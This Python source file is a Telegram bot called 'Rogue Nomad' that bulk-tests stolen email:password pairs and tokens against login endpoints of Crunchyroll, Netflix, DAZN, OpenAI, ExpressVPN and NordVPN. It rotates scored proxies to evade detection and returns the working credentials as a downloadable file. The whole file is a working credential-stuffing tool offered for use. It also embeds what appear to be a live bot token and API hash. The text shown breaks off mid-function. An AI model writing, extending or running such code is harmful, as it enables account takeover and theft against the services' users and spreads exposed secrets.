#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ROGUE NOMAD - Premium Checker Bot
Web Service Version for Render Free Tier
"""

import os
import asyncio
import logging
import json
import re
import io
import random
import time
import threading
from datetime import datetime
from typing import Dict, List, Optional, Any
from contextlib import asynccontextmanager

from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
import aiohttp
import aiosqlite

# ============================================
# CONFIGURATION - YOUR CREDENTIALS
# ============================================
BOT_TOKEN = "8651086980:AAFe43rg62NOceSHi-kdb5gbEK5QRqqr09E"
ADMIN_ID = 1875307475
CHANNEL_ID = -1003861121732
DATABASE_URL = "rogue_nomad.db"
LOG_LEVEL = "INFO"
BOT_LINK = "https://t.me/+ckfO94UHyhllODg0"
BOT_USERNAME = "@roguenomad_bot"
BOT_NAME = "Rogue Nomad"
BOT_VERSION = "v3.0"
PORT = int(os.environ.get("PORT", 10000))
APP_API_ID = 27456172
APP_API_HASH = "a2e90f559f8ba51bbe424039b98f2ee1"

# ============================================
# LOGGING SETUP
# ============================================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    datefmt="%d-%b-%Y %H:%M:%S",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================
# DATABASE INITIALIZATION
# ============================================
INIT_DB = """
CREATE TABLE IF NOT EXISTS proxies (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    proxy TEXT UNIQUE NOT NULL,
    score INTEGER DEFAULT 100,
    failures INTEGER DEFAULT 0,
    alive BOOLEAN DEFAULT 1,
    last_used TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS checks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    chat_id INTEGER NOT NULL,
    service TEXT NOT NULL,
    credential TEXT NOT NULL,
    valid BOOLEAN DEFAULT 0,
    status TEXT,
    data TEXT,
    proxy_used TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS user_stats (
    user_id INTEGER PRIMARY KEY,
    total_checks INTEGER DEFAULT 0,
    total_valid INTEGER DEFAULT 0,
    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS global_stats (
    id INTEGER PRIMARY KEY,
    service TEXT NOT NULL,
    total INTEGER DEFAULT 0,
    valid INTEGER DEFAULT 0,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    first_name TEXT,
    joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    is_member BOOLEAN DEFAULT 0
);

CREATE INDEX IF NOT EXISTS idx_checks_user ON checks(user_id);
CREATE INDEX IF NOT EXISTS idx_checks_service ON checks(service);
CREATE INDEX IF NOT EXISTS idx_checks_created ON checks(created_at);
CREATE INDEX IF NOT EXISTS idx_proxy_alive ON proxies(alive);
CREATE INDEX IF NOT EXISTS idx_proxy_score ON proxies(score);
"""

@asynccontextmanager
async def get_db():
    async with aiosqlite.connect(DATABASE_URL) as db:
        await db.execute(INIT_DB)
        await db.commit()
        yield db

# ============================================
# CHANNEL MEMBERSHIP CHECK
# ============================================
async def is_user_in_channel(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception as e:
        logger.error(f"Channel check failed for user {user_id}: {e}")
        return False

async def check_and_prompt_join(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        return True
    if context.user_data.get("is_verified"):
        return True
    async with get_db() as db:
        cursor = await db.execute("SELECT is_member FROM users WHERE user_id = ?", (user_id,))
        result = await cursor.fetchone()
        if result and result[0] == 1:
            context.user_data["is_verified"] = True
            return True
    is_member = await is_user_in_channel(user_id, context)
    if is_member:
        async with get_db() as db:
            await db.execute(
                "INSERT OR REPLACE INTO users (user_id, is_member, last_active) VALUES (?, 1, CURRENT_TIMESTAMP)",
                (user_id,)
            )
            await db.commit()
        context.user_data["is_verified"] = True
        return True
    
    keyboard = [
        [InlineKeyboardButton("🔗 Join Channel", url=BOT_LINK)],
        [InlineKeyboardButton("✅ I've Joined", callback_data="check_membership")],
        [InlineKeyboardButton("💬 Chat Owner", url="https://t.me/roguenomad_bot")],
    ]
    await update.message.reply_text(
        "🚫 Access Restricted\n\nTo use this bot, you must join our channel first:\n\n" + BOT_LINK + "\n\nAfter joining, click the button below to verify.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=None
    )
    return False

async def check_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        context.user_data["is_verified"] = True
        await query.edit_message_text("✅ Admin access granted.")
        await show_welcome(update, context)
        return
    is_member = await is_user_in_channel(user_id, context)
    if is_member:
        async with get_db() as db:
            await db.execute(
                "INSERT OR REPLACE INTO users (user_id, is_member, last_active) VALUES (?, 1, CURRENT_TIMESTAMP)",
                (user_id,)
            )
            await db.commit()
        context.user_data["is_verified"] = True
        await query.edit_message_text("✅ Verification successful! You can now use the bot.")
        await show_welcome(update, context)
    else:
        await query.edit_message_text(
            "❌ You haven't joined yet.\n\nPlease join our channel first:\n" + BOT_LINK + "\n\nThen click the button again.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Join Channel", url=BOT_LINK)],
                [InlineKeyboardButton("✅ I've Joined", callback_data="check_membership")]
            ]),
            parse_mode=None
        )

# ============================================
# PROXY MANAGER
# ============================================
class ProxyManager:
    def __init__(self):
        self._cache = []
        self._cache_time = 0
        self._cache_ttl = 60
    
    async def get_working_proxies(self) -> List[str]:
        if time.time() - self._cache_time < self._cache_ttl and self._cache:
            return self._cache
        async with get_db() as db:
            cursor = await db.execute("SELECT proxy FROM proxies WHERE alive = 1 ORDER BY score DESC LIMIT 500")
            rows = await cursor.fetchall()
            self._cache = [row[0] for row in rows]
            self._cache_time = time.time()
            return self._cache
    
    async def get_proxy(self) -> Optional[str]:
        proxies = await self.get_working_proxies()
        if not proxies:
            return None
        return random.choice(proxies)
    
    async def add_proxy(self, proxy: str) -> bool:
        proxy = proxy.replace("http://", "").replace("https://", "").strip()
        if not proxy or ":" not in proxy:
            return False
        parts = proxy.split(":")
        if len(parts) not in [2, 4]:
            return False
        try:
            async with get_db() as db:
                await db.execute("INSERT OR IGNORE INTO proxies (proxy) VALUES (?)", (proxy,))
                await db.commit()
                self._cache = []
                return True
        except Exception as e:
            logger.error(f"Error adding proxy {proxy}: {e}")
            return False
    
    async def add_proxies_from_text(self, content: str) -> int:
        added = 0
        for line in content.strip().split("\n"):
            line = line.strip()
            if line and not line.startswith("#"):
                if await self.add_proxy(line):
                    added += 1
        return added
    
    async def report_result(self, proxy: str, success: bool):
        if not proxy:
            return
        async with get_db() as db:
            if success:
                await db.execute("UPDATE proxies SET score = MIN(100, score + 5), failures = 0 WHERE proxy = ?", (proxy,))
            else:
                await db.execute("UPDATE proxies SET score = MAX(0, score - 10), failures = failures + 1 WHERE proxy = ?", (proxy,))
                await db.execute("UPDATE proxies SET alive = 0 WHERE proxy = ? AND failures >= 3", (proxy,))
            await db.commit()
            self._cache = []
    
    async def get_stats(self) -> Dict:
        async with get_db() as db:
            total = await db.execute_fetchall("SELECT COUNT(*) FROM proxies")
            alive = await db.execute_fetchall("SELECT COUNT(*) FROM proxies WHERE alive = 1")
            return {"total": total[0][0] if total else 0, "alive": alive[0][0] if alive else 0}
    
    async def clear_dead_proxies(self) -> int:
        async with get_db() as db:
            cursor = await db.execute("DELETE FROM proxies WHERE alive = 0")
            await db.commit()
            removed = cursor.rowcount
            self._cache = []
            return removed

# ============================================
# SERVICE CHECKERS
# ============================================
class ServiceCheckers:
    @staticmethod
    async def check_crunchyroll(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://www.crunchyroll.com/", proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    html = await resp.text()
                    csrf_match = re.search(r'csrf_token["\s:]+"([^"]+)"', html)
                    csrf = csrf_match.group(1) if csrf_match else ""
                async with session.post(
                    "https://www.crunchyroll.com/login",
                    data={"email": email, "password": password, "csrf_token": csrf},
                    proxy=proxy,
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 302:
                        return {"valid": True, "status": "active", "tier": "premium"}
                    return {"valid": False, "status": "invalid"}
        except Exception as e:
            return {"valid": False, "status": "error", "error": str(e)}
    
    @staticmethod
    async def check_netflix_token(token: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                headers = {"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
                async with session.get("https://www.netflix.com/api/shakti/viper/metadata", headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active"}
                    return {"valid": False, "status": "expired"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_dazn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post("https://login.dazn.com/v1/auth/login", json={"email": email, "password": password}, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {"valid": True, "status": "active", "region": data.get("region", "Unknown")}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_openai_token(token: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                headers = {"Authorization": f"Bearer {token}"}
                async with session.get("https://api.openai.com/v1/models", headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active", "tier": "paid"}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_expressvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post("https://www.expressvpn.com/api/v1/auth/login", json={"email": email, "password": password}, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {"valid": True, "status": "active", "plan": data.get("plan", "Unknown")}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_nordvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post("https://api.nordvpn.com/v1/users/login", json={"email": email, "password": password}, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active"}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}

# ============================================
# CHECKER ENGINE
# ============================================
class CheckerEngine:
    def __init__(self, proxy_manager: ProxyManager):
        self.proxy_manager = proxy_manager
        self.services = {
            "crunchyroll": {"checker": ServiceCheckers.check_crunchyroll, "type": "email:pass", "label": "🎬 Crunchyroll"},
            "netflix": {"checker": ServiceCheckers.check_netflix_token, "type": "token", "label": "🎬 Netflix"},
            "dazn": {"checker": ServiceCheckers.check_dazn, "type": "email:pass", "label": "🎬 DAZN"},
            "openai": {"checker": ServiceCheckers.check_openai_token, "type": "token", "label": "🧠 OpenAI"},
            "expressvpn": {"checker": ServiceCheckers.check_expressvpn, "type": "email:pass", "label": "🔒 ExpressVPN"},
            "nordvpn": {"checker": ServiceCheckers.check_nordvpn, "type": "email:pass", "label": "🔐 NordVPN"},
        }
        self.semaphore = asyncio.Semaphore(30)
        self.stats = {"total": 0, "valid": 0, "invalid": 0, "errors": 0, "by_service": {}}
    
    def _parse_credential(self, cred: str) -> Dict:
        cred = cred.strip()
        if ":" in cred and "@" in cred:
            parts = cred.split(":", 1)
            return {"email": parts[0].strip(), "password": parts[1].strip()}
        elif cred.startswith("ey") or len(cred) > 30:
            return {"token": cred}
        else:
            return {"raw": cred}
    
    async def check_single(self, service: str, credential: str, use_proxy: bool = True, user_id: int = 0, chat_id: int = 0) -> Dict:
        async with self.semaphore:
            proxy = await self.proxy_manager.get_proxy() if use_proxy else None
            service_info = self.services.get(service)
            if not service_info:
                return {"valid": False, "status": "unknown_service"}
            checker = service_info["checker"]
            parsed = self._parse_credential(credential)
            try:
                result = await checker(**parsed, proxy=proxy)
                if proxy:
                    await self.proxy_manager.report_result(proxy, result.get("valid", False))
                self._update_stats(service, result.get("valid", False))
                await self._log_check(user_id, chat_id, service, credential[:50], result.get("valid", False), result.get("status", "unknown"), json.dumps(result), proxy)
                result["proxy_used"] = proxy
                return result
            except Exception as e:
                self.stats["errors"] += 1
                await self._log_check(user_id, chat_id, service, credential[:50], False, "error", json.dumps({"error": str(e)}), proxy)
                return {"valid": False, "status": "error", "error": str(e)}
    
    async def check_batch(self, service: str, credentials: List[str], use_proxy: bool = True, user_id: int = 0, chat_id: int = 0, max_workers: int = 20) -> List[Dict]:
        sem = asyncio.Semaphore(max_workers)
        async def limited_check(cred):
            async with sem:
                return await self.check_single(service, cred, use_proxy, user_id, chat_id)
        tasks = [limited_check(cred) for cred in credentials]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        processed = []
        for r in results:
            if isinstance(r, Exception):
                processed.append({"valid": False, "status": "error", "error": str(r)})
            else:
                processed.append(r)
        return processed
    
    async def _log_check(self, user_id, chat_id, service, credential, valid, status, data, proxy):
        try:
            async with get_db() as db:
                await db.execute(
                    "INSERT INTO checks (user_id, chat_id, service, credential, valid, status, data, proxy_used) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (user_id, chat_id, service, credential, valid, status, data, proxy or "")
                )
                await db.execute("INSERT OR REPLACE INTO users (user_id, last_active) VALUES (?, CURRENT_TIMESTAMP)", (user_id,))
                await db.commit()
        except Exception as e:
            logger.error(f"Failed to log check: {e}")
    
    def _update_stats(self, service: str, valid: bool):
        self.stats["total"] += 1
        if valid:
            self.stats["valid"] += 1
        else:
            self.stats["invalid"] += 1
        if service not in self.stats["by_service"]:
            self.stats["by_service"][service] = {"total": 0, "valid": 0}
        self.stats["by_service"][service]["total"] += 1
        if valid:
            self.stats["by_service"][service]["valid"] += 1
    
    def get_stats(self) -> Dict:
        return self.stats

# ============================================
# TELEGRAM BOT - INITIALIZE
# ============================================
proxy_manager = ProxyManager()
checker_engine = CheckerEngine(proxy_manager)

SERVICE_CATEGORIES = {
    "Streaming Services": {
        "crunchyroll": "🎬 Crunchyroll",
        "netflix": "🎬 Netflix",
        "dazn": "🎬 DAZN"
    },
    "VPN / Proxy Services": {
        "expressvpn": "🔒 ExpressVPN",
        "nordvpn": "🔐 NordVPN"
    },
    "AI Services": {
        "openai": "🧠 OpenAI"
    }
}

# ============================================
# WELCOME & CHECKERS
# ============================================
async def show_welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [
        [InlineKeyboardButton("👤 Chat Owner", url="https://t.me/roguenomad_bot")],
        [InlineKeyboardButton("🔗 Join Channel", url=BOT_LINK)],
        [InlineKeyboardButton("🚀 Start Now", callback_data="checkers")],
    ]
    welcome_text = (
        "🔥 Welcome to Rogue Nomad\n\n"
        "Account Checker\n\n"
        "My fellow nomad, how can I help you?\n"
    )
    await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=None)

async def show_checkers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show the checkers menu - called by both /checkers command and Start Now button"""
    if not await check_and_prompt_join(update, context):
        return
    
    # Get user info to send proper response
    if hasattr(update, 'callback_query') and update.callback_query:
        query = update.callback_query
        await query.answer()
        message = query.message
        edit_func = query.edit_message_text
    else:
        message = update.message
        edit_func = None
    
    keyboard = []
    for category, services in SERVICE_CATEGORIES.items():
        keyboard.append([InlineKeyboardButton(category, callback_data=f"cat_{category}")])
    keyboard.append([InlineKeyboardButton("📊 Stats", callback_data="show_stats")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_start")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = "🎯 Select a category:"
    
    if edit_func:
        await edit_func(text, reply_markup=reply_markup, parse_mode=None)
    else:
        await message.reply_text(text, reply_markup=reply_markup, parse_mode=None)

# ============================================
# COMMAND HANDLERS
# ============================================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_and_prompt_join(update, context):
        return
    await show_welcome(update, context)

async def checkers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /checkers command"""
    await show_checkers(update, context)

async def checkers_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle Start Now button callback"""
    query = update.callback_query
    await query.answer()
    await show_checkers(update, context)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_and_prompt_join(update, context):
        return
    help_text = (
        "📖 Rogue Nomad Help\n\n"
        "Commands:\n"
        "/start - Welcome menu\n"
        "/checkers - Show all services\n"
        "/proxy - Manage proxies\n"
        "/stats - Show statistics\n"
        "/help - This menu\n"
        "/about - About Rogue Nomad\n"
        "/cancel - Stop current task\n\n"
        "How to check credentials:\n"
        "1. Use /checkers\n"
        "2. Select a service\n"
        "3. Send credentials (one per line)\n"
        "4. Or upload a .txt file\n\n"
        "Proxy formats:\n"
        "• host:port\n"
        "• host:port:user:pass\n"
        "• http://host:port\n\n"
        "To add proxies: upload a .txt file or send proxy:host:port"
    )
    await update.message.reply_text(help_text, parse_mode=None)

async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_and_prompt_join(update, context):
        return
    about_text = (
        "🔥 Rogue Nomad v3.0\n\n"
        "The Ultimate Checker Bot\n"
        "Created by Butter\n\n"
        "Features:\n"
        "• Multi-service credential checking\n"
        "• Proxy rotation with scoring\n"
        "• Batch processing with file upload\n"
        "• Real-time statistics\n"
        "• Channel lock protection\n\n"
        "Support: @roguenomad_bot\n"
        "Channel: " + BOT_LINK
    )
    await update.message.reply_text(about_text, parse_mode=None)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_and_prompt_join(update, context):
        return
    stats = checker_engine.get_stats()
    proxy_stats = await proxy_manager.get_stats()
    text = (
        "📊 Statistics\n\n"
        f"Total: {stats['total']}\n"
        f"✅ Valid: {stats['valid']}\n"
        f"❌ Invalid: {stats['invalid']}\n"
        f"🌐 Proxies: {proxy_stats['alive']}/{proxy_stats['total']}\n\n"
        "By Service:\n"
    )
    for service, data in stats.get("by_service", {}).items():
        label = checker_engine.services.get(service, {}).get("label", service)
        text += f"• {label}: {data['valid']}/{data['total']}\n"
    await update.message.reply_text(text, parse_mode=None)

async def handle_category(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not await check_and_prompt_join(update, context):
        return
    category = query.data.replace("cat_", "")
    services = SERVICE_CATEGORIES.get(category, {})
    keyboard = []
    for key, label in services.items():
        keyboard.append([InlineKeyboardButton(label, callback_data=f"svc_{key}")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="checkers")])
    await query.edit_message_text(f"📋 {category}\nSelect a service:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=None)

async def handle_service_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not await check_and_prompt_join(update, context):
        return
    service = query.data.replace("svc_", "")
    context.user_data["check_service"] = service
    context.user_data["waiting_for_creds"] = True
    context.user_data["use_proxy"] = True  # default ON
    
    service_info = checker_engine.services.get(service, {})
    label = service_info.get("label", service)
    cred_type = service_info.get("type", "email:pass or token")
    proxy_stats = await proxy_manager.get_stats()
    
    # Show credential input with proxy toggle
    await query.edit_message_text(
        f"🔍 Checking {label}\n\n"
        f"Send credentials (one per line):\n"
        f"• {cred_type}\n"
        f"• Or upload a .txt file\n\n"
        f"🌐 Proxy: {'ON' if context.user_data.get('use_proxy', True) else 'OFF'}\n"
        f"📊 Proxies available: {proxy_stats['alive']}\n\n"
        f"To add proxies:\n"
        f"• Upload a .txt file with proxies\n"
        f"• Send: proxy:host:port\n\n"
        f"Use /cancel to stop.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(f"🌐 Toggle Proxy {'ON' if context.user_data.get('use_proxy', True) else 'OFF'}", callback_data="toggle_proxy")],
            [InlineKeyboardButton("🔙 Back", callback_data="checkers")]
        ]),
        parse_mode=None
    )

async def toggle_proxy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    current = context.user_data.get("use_proxy", True)
    context.user_data["use_proxy"] = not current
    # Update the message with new toggle state
    await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🌐 Toggle Proxy {'ON' if context.user_data['use_proxy'] else 'OFF'}", callback_data="toggle_proxy")],
        [InlineKeyboardButton("🔙 Back", callback_data="checkers")]
    ]))

async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_and_prompt_join(update, context):
        return
    proxy_stats = await proxy_manager.get_stats()
    keyboard = [
        [InlineKeyboardButton("📊 Proxy Stats", callback_data="proxy_stats")],
        [InlineKeyboardButton("🗑️ Clear Dead Proxies", callback_data="proxy_clear")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
    ]
    await update.message.reply_text(
        f"🌐 Proxy Management\n\n"
        f"📊 Proxies: {proxy_stats['alive']} working / {proxy_stats['total']} total\n\n"
        f"How to add proxies:\n"
        f"• Upload a .txt file with proxies (one per line)\n"
        f"• Send: proxy:host:port\n"
        f"• Send: host:port\n\n"
        f"Supported formats:\n"
        f"• host:port\n"
        f"• host:port:user:pass\n"
        f"• http://host:port",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=None
    )

async def handle_proxy_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_and_prompt_join(update, context):
        return
    text = update.message.text.strip() if update.message.text else ""
    content = ""
    
    if update.message.document:
        file = await update.message.document.get_file()
        data = await file.download_as_bytearray()
        content = data.decode("utf-8")
    elif text.startswith("proxy:"):
        content = text.replace("proxy:", "").strip()
    elif ":" in text and not text.startswith("/"):
        content = text
    else:
        return False
    
    count = await proxy_manager.add_proxies_from_text(content)
    working = len(await proxy_manager.get_working_proxies())
    
    await update.message.reply_text(
        f"✅ Proxy Import Complete\n\n"
        f"Added: {count} proxies\n"
        f"Working: {working} proxies\n"
        f"Use /proxy to manage them.",
        parse_mode=None
    )
    return True

# ============================================
# MESSAGE HANDLER
# ============================================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_and_prompt_join(update, context):
        return
    
    # Check for proxy upload
    if update.message.document:
        file_name = update.message.document.file_name or ""
        if file_name.lower().endswith(".txt"):
            handled = await handle_proxy_upload(update, context)
            if handled:
                return
        else:
            await update.message.reply_text("📄 Please upload a .txt file for proxies or credentials.")
            return
    
    if update.message.text:
        text = update.message.text.strip()
        if text.startswith("proxy:") or ("." in text and ":" in text and not text.startswith("/")):
            handled = await handle_proxy_upload(update, context)
            if handled:
                return
    
    # Check if waiting for credentials
    if context.user_data.get("waiting_for_creds"):
        service = context.user_data.get("check_service")
        if not service:
            await update.message.reply_text("❌ No service selected. Use /checkers first.")
            return
        
        if update.message.document:
            file = await update.message.document.get_file()
            content = await file.download_as_bytearray()
            credentials = content.decode("utf-8").strip().split("\n")
        else:
            credentials = update.message.text.strip().split("\n")
        
        credentials = [c.strip() for c in credentials if c.strip()]
        if not credentials:
            await update.message.reply_text("❌ No credentials provided.")
            return
        
        status_msg = await update.message.reply_text(f"⏳ Checking {len(credentials)} credentials...", parse_mode=None)
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        use_proxy = context.user_data.get("use_proxy", True)
        
        results = await checker_engine.check_batch(service, credentials, use_proxy, user_id, chat_id)
        
        valid = [r for r in results if r.get("valid")]
        invalid = [r for r in results if not r.get("valid")]
        
        if valid:
            output_lines = []
            for i, r in enumerate(valid):
                cred = credentials[i] if i < len(credentials) else "unknown"
                output_lines.append(f"{cred} | {r.get('status', 'active')}")
            output = "\n".join(output_lines)
            output_file = io.StringIO(output)
            output_file.name = f"valid_{service}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            await update.message.reply_document(document=output_file, filename=output_file.name, caption=f"✅ {len(valid)} valid credentials found.")
        
        summary = f"📊 Check Complete\nService: {service}\nTotal: {len(results)}\n✅ Valid: {len(valid)}\n❌ Invalid: {len(invalid)}"
        await update.message.reply_text(summary, parse_mode=None)
        await status_msg.delete()
        context.user_data["waiting_for_creds"] = False
        return
    
    await update.message.reply_text(
        "🤔 I didn't understand that.\n\n"
        "Try:\n"
        "• /checkers - Show all services\n"
        "• /proxy - Manage proxies\n"
        "• Upload a .txt file with proxies\n"
        "• Send: proxy:host:port",
        parse_mode=None
    )

# ============================================
# ADMIN COMMANDS
# ============================================
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return
    keyboard = [
        [InlineKeyboardButton("📊 Full Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        [InlineKeyboardButton("🔄 Reset Stats", callback_data="admin_reset")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
    ]
    await update.message.reply_text("🔐 Admin Panel", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=None)

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("📢 Usage: /broadcast <message>")
        return
    message = " ".join(context.args)
    async with get_db() as db:
        cursor = await db.execute("SELECT user_id FROM users")
        users = await cursor.fetchall()
    sent = 0
    for user in users:
        try:
            await context.bot.send_message(chat_id=user[0], text=f"📢 Broadcast from Admin\n\n{message}", parse_mode=None)
            sent += 1
            await asyncio.sleep(0.05)
        except:
            pass
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users.", parse_mode=None)

async def reset_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return
    checker_engine.stats = {"total": 0, "valid": 0, "invalid": 0, "errors": 0, "by_service": {}}
    async with get_db() as db:
        await db.execute("DELETE FROM checks")
        await db.execute("DELETE FROM user_stats")
        await db.execute("DELETE FROM global_stats")
        await db.commit()
    await update.message.reply_text("✅ Statistics reset.", parse_mode=None)

async def back_to_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not await check_and_prompt_join(update, context):
        return
    await show_welcome(update, context)

async def show_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not await check_and_prompt_join(update, context):
        return
    stats = checker_engine.get_stats()
    proxy_stats = await proxy_manager.get_stats()
    text = (
        f"📊 Statistics\n\n"
        f"Total: {stats['total']}\n"
        f"✅ Valid: {stats['valid']}\n"
        f"❌ Invalid: {stats['invalid']}\n"
        f"🌐 Proxies: {proxy_stats['alive']}/{proxy_stats['total']}\n\n"
        "By Service:\n"
    )
    for service, data in stats.get("by_service", {}).items():
        label = checker_engine.services.get(service, {}).get("label", service)
        text += f"• {label}: {data['valid']}/{data['total']}\n"
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="checkers")]]), parse_mode=None)

async def proxy_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not await check_and_prompt_join(update, context):
        return
    stats = await proxy_manager.get_stats()
    proxies = await proxy_manager.get_working_proxies()
    sample = "\n".join([f"• {p}" for p in proxies[:5]]) if proxies else "No proxies available"
    await query.edit_message_text(
        f"🌐 Proxy Statistics\n\n"
        f"Total: {stats['total']}\n"
        f"Working: {stats['alive']}\n\n"
        f"Sample working proxies:\n{sample}\n\n"
        f"{'... and ' + str(len(proxies) - 5) + ' more' if len(proxies) > 5 else ''}",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="proxy")]]),
        parse_mode=None
    )

async def proxy_clear_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not await check_and_prompt_join(update, context):
        return
    removed = await proxy_manager.clear_dead_proxies()
    await query.edit_message_text(
        f"🗑️ Dead Proxies Cleared\n\nRemoved {removed} dead proxies from the database.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="proxy")]]),
        parse_mode=None
    )

# ============================================
# FLASK APP FOR RENDER WEB SERVICE
# ============================================
flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return f"{BOT_NAME} is running!", 200

@flask_app.route('/health')
def health_check():
    return {"status": "ok", "bot": BOT_NAME, "version": BOT_VERSION}, 200

def run_flask():
